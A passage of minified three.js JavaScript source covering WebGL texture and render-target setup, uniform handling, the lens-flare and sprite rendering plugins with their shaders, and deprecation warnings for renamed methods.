THREE.LinearFilter.\",g));!(h=b.get(\"EXT_texture_filter_anisotropic\"))||g.type===THREE.FloatType&&null===b.get(\"OES_texture_float_linear\")||g.type===THREE.HalfFloatType&&null===b.get(\"OES_texture_half_float_linear\")||!(1<g.anisotropy||d.get(g).__currentAnisotropy)||\n(a.texParameterf(c,h.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(g.anisotropy,e.getMaxAnisotropy())),d.get(g).__currentAnisotropy=g.anisotropy)}function r(b,e,g,h){var k=f(e.texture.format),l=f(e.texture.type);c.texImage2D(h,0,k,e.width,e.height,0,k,l,null);a.bindFramebuffer(a.FRAMEBUFFER,b);a.framebufferTexture2D(a.FRAMEBUFFER,g,h,d.get(e.texture).__webglTexture,0);a.bindFramebuffer(a.FRAMEBUFFER,null)}function s(b,c){a.bindRenderbuffer(a.RENDERBUFFER,b);c.depthBuffer&&!c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,\na.DEPTH_COMPONENT16,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.RENDERBUFFER,b)):c.depthBuffer&&c.stencilBuffer?(a.renderbufferStorage(a.RENDERBUFFER,a.DEPTH_STENCIL,c.width,c.height),a.framebufferRenderbuffer(a.FRAMEBUFFER,a.DEPTH_STENCIL_ATTACHMENT,a.RENDERBUFFER,b)):a.renderbufferStorage(a.RENDERBUFFER,a.RGBA4,c.width,c.height);a.bindRenderbuffer(a.RENDERBUFFER,null)}var t=g.memory,u=\"undefined\"!==typeof WebGL2RenderingContext&&a instanceof WebGL2RenderingContext;\nthis.setTexture2D=m;this.setTextureCube=function(b,g){var l=d.get(b);if(6===b.image.length)if(0<b.version&&l.__version!==b.version){l.__image__webglTextureCube||(b.addEventListener(\"dispose\",n),l.__image__webglTextureCube=a.createTexture(),t.textures++);c.activeTexture(a.TEXTURE0+g);c.bindTexture(a.TEXTURE_CUBE_MAP,l.__image__webglTextureCube);a.pixelStorei(a.UNPACK_FLIP_Y_WEBGL,b.flipY);for(var m=b instanceof THREE.CompressedTexture,p=b.image[0]instanceof THREE.DataTexture,r=[],s=0;6>s;s++)r[s]=\nm||p?p?b.image[s].image:b.image[s]:h(b.image[s],e.maxCubemapSize);var u=k(r[0]),B=f(b.format),F=f(b.type);q(a.TEXTURE_CUBE_MAP,b,u);for(s=0;6>s;s++)if(m)for(var K,P=r[s].mipmaps,M=0,H=P.length;M<H;M++)K=P[M],b.format!==THREE.RGBAFormat&&b.format!==THREE.RGBFormat?-1<c.getCompressedTextureFormats().indexOf(B)?c.compressedTexImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,M,B,K.width,K.height,0,K.data):console.warn(\"THREE.WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()\"):\nc.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,M,B,K.width,K.height,0,B,F,K.data);else p?c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,0,B,r[s].width,r[s].height,0,B,F,r[s].data):c.texImage2D(a.TEXTURE_CUBE_MAP_POSITIVE_X+s,0,B,B,F,r[s]);b.generateMipmaps&&u&&a.generateMipmap(a.TEXTURE_CUBE_MAP);l.__version=b.version;if(b.onUpdate)b.onUpdate(b)}else c.activeTexture(a.TEXTURE0+g),c.bindTexture(a.TEXTURE_CUBE_MAP,l.__image__webglTextureCube)};this.setTextureCubeDynamic=function(b,e){c.activeTexture(a.TEXTURE0+\ne);c.bindTexture(a.TEXTURE_CUBE_MAP,d.get(b).__webglTexture)};this.setupRenderTarget=function(b){var e=d.get(b),f=d.get(b.texture);b.addEventListener(\"dispose\",p);f.__webglTexture=a.createTexture();t.textures++;var g=b instanceof THREE.WebGLRenderTargetCube,h=k(b);if(g){e.__webglFramebuffer=[];for(var l=0;6>l;l++)e.__webglFramebuffer[l]=a.createFramebuffer()}else e.__webglFramebuffer=a.createFramebuffer();if(g){c.bindTexture(a.TEXTURE_CUBE_MAP,f.__webglTexture);q(a.TEXTURE_CUBE_MAP,b.texture,h);for(l=\n0;6>l;l++)r(e.__webglFramebuffer[l],b,a.COLOR_ATTACHMENT0,a.TEXTURE_CUBE_MAP_POSITIVE_X+l);b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_CUBE_MAP);c.bindTexture(a.TEXTURE_CUBE_MAP,null)}else c.bindTexture(a.TEXTURE_2D,f.__webglTexture),q(a.TEXTURE_2D,b.texture,h),r(e.__webglFramebuffer,b,a.COLOR_ATTACHMENT0,a.TEXTURE_2D),b.texture.generateMipmaps&&h&&a.generateMipmap(a.TEXTURE_2D),c.bindTexture(a.TEXTURE_2D,null);if(b.depthBuffer){e=d.get(b);f=b instanceof THREE.WebGLRenderTargetCube;if(b.depthTexture){if(f)throw Error(\"target.depthTexture not supported in Cube render targets\");\nif(b instanceof THREE.WebGLRenderTargetCube)throw Error(\"Depth Texture with cube render targets is not supported!\");a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer);if(!(b.depthTexture instanceof THREE.DepthTexture))throw Error(\"renderTarget.depthTexture must be an instance of THREE.DepthTexture\");d.get(b.depthTexture).__webglTexture&&b.depthTexture.image.width===b.width&&b.depthTexture.image.height===b.height||(b.depthTexture.image.width=b.width,b.depthTexture.image.height=b.height,b.depthTexture.needsUpdate=\n!0);m(b.depthTexture,0);b=d.get(b.depthTexture).__webglTexture;a.framebufferTexture2D(a.FRAMEBUFFER,a.DEPTH_ATTACHMENT,a.TEXTURE_2D,b,0)}else if(f)for(e.__webglDepthbuffer=[],f=0;6>f;f++)a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer[f]),e.__webglDepthbuffer[f]=a.createRenderbuffer(),s(e.__webglDepthbuffer[f],b);else a.bindFramebuffer(a.FRAMEBUFFER,e.__webglFramebuffer),e.__webglDepthbuffer=a.createRenderbuffer(),s(e.__webglDepthbuffer,b);a.bindFramebuffer(a.FRAMEBUFFER,null)}};this.updateRenderTargetMipmap=\nfunction(b){var e=b.texture;e.generateMipmaps&&k(b)&&e.minFilter!==THREE.NearestFilter&&e.minFilter!==THREE.LinearFilter&&(b=b instanceof THREE.WebGLRenderTargetCube?a.TEXTURE_CUBE_MAP:a.TEXTURE_2D,e=d.get(e).__webglTexture,c.bindTexture(b,e),a.generateMipmap(b),c.bindTexture(b,null))}};\nTHREE.WebGLUniforms=function(){var a=new THREE.Texture,b=new THREE.CubeTexture,c=[],d=[],e=function(a,b,d){var e=a[0];if(0>=e||0<e)return a;var f=b*d,g=c[f];void 0===g&&(g=new Float32Array(f),c[f]=g);if(0!==b)for(e.toArray(g,0),e=1,f=0;e!==b;++e)f+=d,a[e].toArray(g,f);return g},f=function(a,b){var c=d[b];void 0===c&&(c=new Int32Array(b),d[b]=c);for(var e=0;e!==b;++e)c[e]=a.allocTextureUnit();return c},g=function(a,b){a.uniform1f(this.addr,b)},h=function(a,b){a.uniform1i(this.addr,b)},k=function(a,\nb){void 0===b.x?a.uniform2fv(this.addr,b):a.uniform2f(this.addr,b.x,b.y)},l=function(a,b){void 0!==b.x?a.uniform3f(this.addr,b.x,b.y,b.z):void 0!==b.r?a.uniform3f(this.addr,b.r,b.g,b.b):a.uniform3fv(this.addr,b)},n=function(a,b){void 0===b.x?a.uniform4fv(this.addr,b):a.uniform4f(this.addr,b.x,b.y,b.z,b.w)},p=function(a,b){a.uniformMatrix2fv(this.addr,!1,b.elements||b)},m=function(a,b){a.uniformMatrix3fv(this.addr,!1,b.elements||b)},q=function(a,b){a.uniformMatrix4fv(this.addr,!1,b.elements||b)},r=\nfunction(b,c,d){var e=d.allocTextureUnit();b.uniform1i(this.addr,e);d.setTexture2D(c||a,e)},s=function(a,c,d){var e=d.allocTextureUnit();a.uniform1i(this.addr,e);d.setTextureCube(c||b,e)},t=function(a,b){a.uniform2iv(this.addr,b)},u=function(a,b){a.uniform3iv(this.addr,b)},v=function(a,b){a.uniform4iv(this.addr,b)},C=function(a){switch(a){case 5126:return g;case 35664:return k;case 35665:return l;case 35666:return n;case 35674:return p;case 35675:return m;case 35676:return q;case 35678:return r;case 35680:return s;\ncase 5124:case 35670:return h;case 35667:case 35671:return t;case 35668:case 35672:return u;case 35669:case 35673:return v}},w=function(a,b){a.uniform1fv(this.addr,b)},E=function(a,b){a.uniform1iv(this.addr,b)},z=function(a,b){a.uniform2fv(this.addr,e(b,this.size,2))},y=function(a,b){a.uniform3fv(this.addr,e(b,this.size,3))},A=function(a,b){a.uniform4fv(this.addr,e(b,this.size,4))},I=function(a,b){a.uniformMatrix2fv(this.addr,!1,e(b,this.size,4))},B=function(a,b){a.uniformMatrix3fv(this.addr,!1,e(b,\nthis.size,9))},F=function(a,b){a.uniformMatrix4fv(this.addr,!1,e(b,this.size,16))},K=function(b,c,d){var e=c.length,g=f(d,e);b.uniform1iv(this.addr,g);for(b=0;b!==e;++b)d.setTexture2D(c[b]||a,g[b])},P=function(a,c,d){var e=c.length,g=f(d,e);a.uniform1iv(this.addr,g);for(a=0;a!==e;++a)d.setTextureCube(c[a]||b,g[a])},M=function(a){switch(a){case 5126:return w;case 35664:return z;case 35665:return y;case 35666:return A;case 35674:return I;case 35675:return B;case 35676:return F;case 35678:return K;case 35680:return P;\ncase 5124:case 35670:return E;case 35667:case 35671:return t;case 35668:case 35672:return u;case 35669:case 35673:return v}},H=function(a,b,c){this.id=a;this.addr=c;this.setValue=C(b.type)},L=function(a,b,c){this.id=a;this.addr=c;this.size=b.size;this.setValue=M(b.type)},O=function(a){this.id=a;this.seq=[];this.map={}};O.prototype.setValue=function(a,b){for(var c=this.seq,d=0,e=c.length;d!==e;++d){var f=c[d];f.setValue(a,b[f.id])}};var N=/([\\w\\d_]+)(\\])?(\\[|\\.)?/g,Q=function(a,b,c){this.seq=[];this.map=\n{};this.renderer=c;c=a.getProgramParameter(b,a.ACTIVE_UNIFORMS);for(var d=0;d!==c;++d){var e=a.getActiveUniform(b,d),f=a.getUniformLocation(b,e.name),g=this,h=e.name,k=h.length;for(N.lastIndex=0;;){var l=N.exec(h),m=N.lastIndex,n=l[1],p=l[3];\"]\"===l[2]&&(n|=0);if(void 0===p||\"[\"===p&&m+2===k){h=g;e=void 0===p?new H(n,e,f):new L(n,e,f);h.seq.push(e);h.map[e.id]=e;break}else p=g.map[n],void 0===p&&(p=new O(n),n=g,g=p,n.seq.push(g),n.map[g.id]=g),g=p}}};Q.prototype.setValue=function(a,b,c){b=this.map[b];\nvoid 0!==b&&b.setValue(a,c,this.renderer)};Q.prototype.set=function(a,b,c){var d=this.map[c];void 0!==d&&d.setValue(a,b[c],this.renderer)};Q.prototype.setOptional=function(a,b,c){b=b[c];void 0!==b&&this.setValue(a,c,b)};Q.upload=function(a,b,c,d){for(var e=0,f=b.length;e!==f;++e){var g=b[e],h=c[g.id];!1!==h.needsUpdate&&g.setValue(a,h.value,d)}};Q.seqWithValue=function(a,b){for(var c=[],d=0,e=a.length;d!==e;++d){var f=a[d];f.id in b&&c.push(f)}return c};Q.splitDynamic=function(a,b){for(var c=null,\nd=a.length,e=0,f=0;f!==d;++f){var g=a[f],h=b[g.id];h&&!0===h.dynamic?(null===c&&(c=[]),c.push(g)):(e<f&&(a[e]=g),++e)}e<d&&(a.length=e);return c};Q.evalDynamic=function(a,b,c,d){for(var e=0,f=a.length;e!==f;++e){var g=b[a[e].id],h=g.onUpdateCallback;void 0!==h&&h.call(g,c,d)}};return Q}();\nTHREE.LensFlarePlugin=function(a,b){var c,d,e,f,g,h,k,l,n,p,m=a.context,q=a.state,r,s,t,u,v,C;this.render=function(w,E,z){if(0!==b.length){w=new THREE.Vector3;var y=z.w/z.z,A=.5*z.z,I=.5*z.w,B=16/z.w,F=new THREE.Vector2(B*y,B),K=new THREE.Vector3(1,1,0),P=new THREE.Vector2(1,1),M=new THREE.Box2;M.min.set(0,0);M.max.set(z.z-16,z.w-16);if(void 0===u){var B=new Float32Array([-1,-1,0,0,1,-1,1,0,1,1,1,1,-1,1,0,1]),H=new Uint16Array([0,1,2,0,2,3]);r=m.createBuffer();s=m.createBuffer();m.bindBuffer(m.ARRAY_BUFFER,\nr);m.bufferData(m.ARRAY_BUFFER,B,m.STATIC_DRAW);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);m.bufferData(m.ELEMENT_ARRAY_BUFFER,H,m.STATIC_DRAW);v=m.createTexture();C=m.createTexture();q.bindTexture(m.TEXTURE_2D,v);m.texImage2D(m.TEXTURE_2D,0,m.RGB,16,16,0,m.RGB,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,\nm.NEAREST);q.bindTexture(m.TEXTURE_2D,C);m.texImage2D(m.TEXTURE_2D,0,m.RGBA,16,16,0,m.RGBA,m.UNSIGNED_BYTE,null);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_S,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_WRAP_T,m.CLAMP_TO_EDGE);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MAG_FILTER,m.NEAREST);m.texParameteri(m.TEXTURE_2D,m.TEXTURE_MIN_FILTER,m.NEAREST);var B=t={vertexShader:\"uniform lowp int renderType;\\nuniform vec3 screenPosition;\\nuniform vec2 scale;\\nuniform float rotation;\\nuniform sampler2D occlusionMap;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nvUV = uv;\\nvec2 pos = position;\\nif ( renderType == 2 ) {\\nvec4 visibility = texture2D( occlusionMap, vec2( 0.1, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.1 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.9, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.9 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.1, 0.5 ) );\\nvisibility += texture2D( occlusionMap, vec2( 0.5, 0.5 ) );\\nvVisibility =        visibility.r / 9.0;\\nvVisibility *= 1.0 - visibility.g / 9.0;\\nvVisibility *=       visibility.b / 9.0;\\nvVisibility *= 1.0 - visibility.a / 9.0;\\npos.x = cos( rotation ) * position.x - sin( rotation ) * position.y;\\npos.y = sin( rotation ) * position.x + cos( rotation ) * position.y;\\n}\\ngl_Position = vec4( ( pos * scale + screenPosition.xy ).xy, screenPosition.z, 1.0 );\\n}\",\nfragmentShader:\"uniform lowp int renderType;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform vec3 color;\\nvarying vec2 vUV;\\nvarying float vVisibility;\\nvoid main() {\\nif ( renderType == 0 ) {\\ngl_FragColor = vec4( 1.0, 0.0, 1.0, 0.0 );\\n} else if ( renderType == 1 ) {\\ngl_FragColor = texture2D( map, vUV );\\n} else {\\nvec4 texture = texture2D( map, vUV );\\ntexture.a *= opacity * vVisibility;\\ngl_FragColor = texture;\\ngl_FragColor.rgb *= color;\\n}\\n}\"},H=m.createProgram(),L=m.createShader(m.FRAGMENT_SHADER),\nO=m.createShader(m.VERTEX_SHADER),N=\"precision \"+a.getPrecision()+\" float;\\n\";m.shaderSource(L,N+B.fragmentShader);m.shaderSource(O,N+B.vertexShader);m.compileShader(L);m.compileShader(O);m.attachShader(H,L);m.attachShader(H,O);m.linkProgram(H);u=H;n=m.getAttribLocation(u,\"position\");p=m.getAttribLocation(u,\"uv\");c=m.getUniformLocation(u,\"renderType\");d=m.getUniformLocation(u,\"map\");e=m.getUniformLocation(u,\"occlusionMap\");f=m.getUniformLocation(u,\"opacity\");g=m.getUniformLocation(u,\"color\");h=m.getUniformLocation(u,\n\"scale\");k=m.getUniformLocation(u,\"rotation\");l=m.getUniformLocation(u,\"screenPosition\")}m.useProgram(u);q.initAttributes();q.enableAttribute(n);q.enableAttribute(p);q.disableUnusedAttributes();m.uniform1i(e,0);m.uniform1i(d,1);m.bindBuffer(m.ARRAY_BUFFER,r);m.vertexAttribPointer(n,2,m.FLOAT,!1,16,0);m.vertexAttribPointer(p,2,m.FLOAT,!1,16,8);m.bindBuffer(m.ELEMENT_ARRAY_BUFFER,s);q.disable(m.CULL_FACE);q.setDepthWrite(!1);H=0;for(L=b.length;H<L;H++)if(B=16/z.w,F.set(B*y,B),O=b[H],w.set(O.matrixWorld.elements[12],\nO.matrixWorld.elements[13],O.matrixWorld.elements[14]),w.applyMatrix4(E.matrixWorldInverse),w.applyProjection(E.projectionMatrix),K.copy(w),P.x=z.x+K.x*A+A-8,P.y=z.y+K.y*I+I-8,!0===M.containsPoint(P)){q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,null);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGB,P.x,P.y,16,16,0);m.uniform1i(c,0);m.uniform2f(h,F.x,F.y);m.uniform3f(l,K.x,K.y,K.z);q.disable(m.BLEND);q.enable(m.DEPTH_TEST);m.drawElements(m.TRIANGLES,\n6,m.UNSIGNED_SHORT,0);q.activeTexture(m.TEXTURE0);q.bindTexture(m.TEXTURE_2D,C);m.copyTexImage2D(m.TEXTURE_2D,0,m.RGBA,P.x,P.y,16,16,0);m.uniform1i(c,1);q.disable(m.DEPTH_TEST);q.activeTexture(m.TEXTURE1);q.bindTexture(m.TEXTURE_2D,v);m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0);O.positionScreen.copy(K);O.customUpdateCallback?O.customUpdateCallback(O):O.updateLensFlares();m.uniform1i(c,2);q.enable(m.BLEND);for(var N=0,Q=O.lensFlares.length;N<Q;N++){var J=O.lensFlares[N];.001<J.opacity&&.001<J.scale&&\n(K.x=J.x,K.y=J.y,K.z=J.z,B=J.size*J.scale/z.w,F.x=B*y,F.y=B,m.uniform3f(l,K.x,K.y,K.z),m.uniform2f(h,F.x,F.y),m.uniform1f(k,J.rotation),m.uniform1f(f,J.opacity),m.uniform3f(g,J.color.r,J.color.g,J.color.b),q.setBlending(J.blending,J.blendEquation,J.blendSrc,J.blendDst),a.setTexture2D(J.texture,1),m.drawElements(m.TRIANGLES,6,m.UNSIGNED_SHORT,0))}}q.enable(m.CULL_FACE);q.enable(m.DEPTH_TEST);q.setDepthWrite(!0);a.resetGLState()}}};\nTHREE.SpritePlugin=function(a,b){var c,d,e,f,g,h,k,l,n,p,m,q,r,s,t,u,v;function C(a,b){return a.renderOrder!==b.renderOrder?a.renderOrder-b.renderOrder:a.z!==b.z?b.z-a.z:b.id-a.id}var w=a.context,E=a.state,z,y,A,I,B=new THREE.Vector3,F=new THREE.Quaternion,K=new THREE.Vector3;this.render=function(P,M){if(0!==b.length){if(void 0===A){var H=new Float32Array([-.5,-.5,0,0,.5,-.5,1,0,.5,.5,1,1,-.5,.5,0,1]),L=new Uint16Array([0,1,2,0,2,3]);z=w.createBuffer();y=w.createBuffer();w.bindBuffer(w.ARRAY_BUFFER,\nz);w.bufferData(w.ARRAY_BUFFER,H,w.STATIC_DRAW);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.bufferData(w.ELEMENT_ARRAY_BUFFER,L,w.STATIC_DRAW);var H=w.createProgram(),L=w.createShader(w.VERTEX_SHADER),O=w.createShader(w.FRAGMENT_SHADER);w.shaderSource(L,[\"precision \"+a.getPrecision()+\" float;\",\"uniform mat4 modelViewMatrix;\\nuniform mat4 projectionMatrix;\\nuniform float rotation;\\nuniform vec2 scale;\\nuniform vec2 uvOffset;\\nuniform vec2 uvScale;\\nattribute vec2 position;\\nattribute vec2 uv;\\nvarying vec2 vUV;\\nvoid main() {\\nvUV = uvOffset + uv * uvScale;\\nvec2 alignedPosition = position * scale;\\nvec2 rotatedPosition;\\nrotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;\\nrotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;\\nvec4 finalPosition;\\nfinalPosition = modelViewMatrix * vec4( 0.0, 0.0, 0.0, 1.0 );\\nfinalPosition.xy += rotatedPosition;\\nfinalPosition = projectionMatrix * finalPosition;\\ngl_Position = finalPosition;\\n}\"].join(\"\\n\"));\nw.shaderSource(O,[\"precision \"+a.getPrecision()+\" float;\",\"uniform vec3 color;\\nuniform sampler2D map;\\nuniform float opacity;\\nuniform int fogType;\\nuniform vec3 fogColor;\\nuniform float fogDensity;\\nuniform float fogNear;\\nuniform float fogFar;\\nuniform float alphaTest;\\nvarying vec2 vUV;\\nvoid main() {\\nvec4 texture = texture2D( map, vUV );\\nif ( texture.a < alphaTest ) discard;\\ngl_FragColor = vec4( color * texture.xyz, texture.a * opacity );\\nif ( fogType > 0 ) {\\nfloat depth = gl_FragCoord.z / gl_FragCoord.w;\\nfloat fogFactor = 0.0;\\nif ( fogType == 1 ) {\\nfogFactor = smoothstep( fogNear, fogFar, depth );\\n} else {\\nconst float LOG2 = 1.442695;\\nfogFactor = exp2( - fogDensity * fogDensity * depth * depth * LOG2 );\\nfogFactor = 1.0 - clamp( fogFactor, 0.0, 1.0 );\\n}\\ngl_FragColor = mix( gl_FragColor, vec4( fogColor, gl_FragColor.w ), fogFactor );\\n}\\n}\"].join(\"\\n\"));\nw.compileShader(L);w.compileShader(O);w.attachShader(H,L);w.attachShader(H,O);w.linkProgram(H);A=H;u=w.getAttribLocation(A,\"position\");v=w.getAttribLocation(A,\"uv\");c=w.getUniformLocation(A,\"uvOffset\");d=w.getUniformLocation(A,\"uvScale\");e=w.getUniformLocation(A,\"rotation\");f=w.getUniformLocation(A,\"scale\");g=w.getUniformLocation(A,\"color\");h=w.getUniformLocation(A,\"map\");k=w.getUniformLocation(A,\"opacity\");l=w.getUniformLocation(A,\"modelViewMatrix\");n=w.getUniformLocation(A,\"projectionMatrix\");p=\nw.getUniformLocation(A,\"fogType\");m=w.getUniformLocation(A,\"fogDensity\");q=w.getUniformLocation(A,\"fogNear\");r=w.getUniformLocation(A,\"fogFar\");s=w.getUniformLocation(A,\"fogColor\");t=w.getUniformLocation(A,\"alphaTest\");H=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\");H.width=8;H.height=8;L=H.getContext(\"2d\");L.fillStyle=\"white\";L.fillRect(0,0,8,8);I=new THREE.Texture(H);I.needsUpdate=!0}w.useProgram(A);E.initAttributes();E.enableAttribute(u);E.enableAttribute(v);E.disableUnusedAttributes();\nE.disable(w.CULL_FACE);E.enable(w.BLEND);w.bindBuffer(w.ARRAY_BUFFER,z);w.vertexAttribPointer(u,2,w.FLOAT,!1,16,0);w.vertexAttribPointer(v,2,w.FLOAT,!1,16,8);w.bindBuffer(w.ELEMENT_ARRAY_BUFFER,y);w.uniformMatrix4fv(n,!1,M.projectionMatrix.elements);E.activeTexture(w.TEXTURE0);w.uniform1i(h,0);L=H=0;(O=P.fog)?(w.uniform3f(s,O.color.r,O.color.g,O.color.b),O instanceof THREE.Fog?(w.uniform1f(q,O.near),w.uniform1f(r,O.far),w.uniform1i(p,1),L=H=1):O instanceof THREE.FogExp2&&(w.uniform1f(m,O.density),\nw.uniform1i(p,2),L=H=2)):(w.uniform1i(p,0),L=H=0);for(var O=0,N=b.length;O<N;O++){var Q=b[O];Q.modelViewMatrix.multiplyMatrices(M.matrixWorldInverse,Q.matrixWorld);Q.z=-Q.modelViewMatrix.elements[14]}b.sort(C);for(var J=[],O=0,N=b.length;O<N;O++){var Q=b[O],D=Q.material;w.uniform1f(t,D.alphaTest);w.uniformMatrix4fv(l,!1,Q.modelViewMatrix.elements);Q.matrixWorld.decompose(B,F,K);J[0]=K.x;J[1]=K.y;Q=0;P.fog&&D.fog&&(Q=L);H!==Q&&(w.uniform1i(p,Q),H=Q);null!==D.map?(w.uniform2f(c,D.map.offset.x,D.map.offset.y),\nw.uniform2f(d,D.map.repeat.x,D.map.repeat.y)):(w.uniform2f(c,0,0),w.uniform2f(d,1,1));w.uniform1f(k,D.opacity);w.uniform3f(g,D.color.r,D.color.g,D.color.b);w.uniform1f(e,D.rotation);w.uniform2fv(f,J);E.setBlending(D.blending,D.blendEquation,D.blendSrc,D.blendDst);E.setDepthTest(D.depthTest);E.setDepthWrite(D.depthWrite);D.map?a.setTexture2D(D.map,0):a.setTexture2D(I,0);w.drawElements(w.TRIANGLES,6,w.UNSIGNED_SHORT,0)}E.enable(w.CULL_FACE);a.resetGLState()}}};\nObject.assign(THREE,{Face4:function(a,b,c,d,e,f,g){console.warn(\"THREE.Face4 has been removed. A THREE.Face3 will be created instead.\");return new THREE.Face3(a,b,c,e,f,g)},LineStrip:0,LinePieces:1,MeshFaceMaterial:THREE.MultiMaterial,PointCloud:function(a,b){console.warn(\"THREE.PointCloud has been renamed to THREE.Points.\");return new THREE.Points(a,b)},Particle:THREE.Sprite,ParticleSystem:function(a,b){console.warn(\"THREE.ParticleSystem has been renamed to THREE.Points.\");return new THREE.Points(a,\nb)},PointCloudMaterial:function(a){console.warn(\"THREE.PointCloudMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},ParticleBasicMaterial:function(a){console.warn(\"THREE.ParticleBasicMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},ParticleSystemMaterial:function(a){console.warn(\"THREE.ParticleSystemMaterial has been renamed to THREE.PointsMaterial.\");return new THREE.PointsMaterial(a)},Vertex:function(a,b,c){console.warn(\"THREE.Vertex has been removed. Use THREE.Vector3 instead.\");\nreturn new THREE.Vector3(a,b,c)}});Object.assign(THREE.Box2.prototype,{empty:function(){console.warn(\"THREE.Box2: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box2: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)}});\nObject.assign(THREE.Box3.prototype,{empty:function(){console.warn(\"THREE.Box3: .empty() has been renamed to .isEmpty().\");return this.isEmpty()},isIntersectionBox:function(a){console.warn(\"THREE.Box3: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Box3: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(THREE.Matrix3.prototype,{multiplyVector3:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.\");return a.applyMatrix3(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix3: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");return this.applyToVector3Array(a)}});\nObject.assign(THREE.Matrix4.prototype,{extractPosition:function(a){console.warn(\"THREE.Matrix4: .extractPosition() has been renamed to .copyPosition().\");return this.copyPosition(a)},setRotationFromQuaternion:function(a){console.warn(\"THREE.Matrix4: .setRotationFromQuaternion() has been renamed to .makeRotationFromQuaternion().\");return this.makeRotationFromQuaternion(a)},multiplyVector3:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3() has been removed. Use vector.applyMatrix4( matrix ) or vector.applyProjection( matrix ) instead.\");\nreturn a.applyProjection(this)},multiplyVector4:function(a){console.warn(\"THREE.Matrix4: .multiplyVector4() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},multiplyVector3Array:function(a){console.warn(\"THREE.Matrix4: .multiplyVector3Array() has been renamed. Use matrix.applyToVector3Array( array ) instead.\");return this.applyToVector3Array(a)},rotateAxis:function(a){console.warn(\"THREE.Matrix4: .rotateAxis() has been removed. Use Vector3.transformDirection( matrix ) instead.\");\na.transformDirection(this)},crossVector:function(a){console.warn(\"THREE.Matrix4: .crossVector() has been removed. Use vector.applyMatrix4( matrix ) instead.\");return a.applyMatrix4(this)},translate:function(a){console.error(\"THREE.Matrix4: .translate() has been removed.\")},rotateX:function(a){console.error(\"THREE.Matrix4: .rotateX() has been removed.\")},rotateY:function(a){console.error(\"THREE.Matrix4: .rotateY() has been removed.\")},rotateZ:function(a){console.error(\"THREE.Matrix4: .rotateZ() has been removed.\")},\nrotateByAxis:function(a,b){console.error(\"THREE.Matrix4: .rotateByAxis() has been removed.\")}});Object.assign(THREE.Plane.prototype,{isIntersectionLine:function(a){console.warn(\"THREE.Plane: .isIntersectionLine() has been renamed to .intersectsLine().\");return this.intersectsLine(a)}});Object.assign(THREE.Quaternion.prototype,{multiplyVector3:function(a){console.warn(\"THREE.Quaternion: .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.\");return a.applyQuaternion(this)}});\nObject.assign(THREE.Ray.prototype,{isIntersectionBox:function(a){console.warn(\"THREE.Ray: .isIntersectionBox() has been renamed to .intersectsBox().\");return this.intersectsBox(a)},isIntersectionPlane:function(a){console.warn(\"THREE.Ray: .isIntersectionPlane() has been renamed to .intersectsPlane().\");return this.intersectsPlane(a)},isIntersectionSphere:function(a){console.warn(\"THREE.Ray: .isIntersectionSphere() has been renamed to .intersectsSphere().\");return this.intersectsSphere(a)}});\nObject.assign(THREE.Vector3.prototype,{setEulerFromRotationMatrix:function(){console.error(\"THREE.Vector3: .setEulerFromRotationMatrix() has been removed. Use Euler.setFromRotationMatrix() 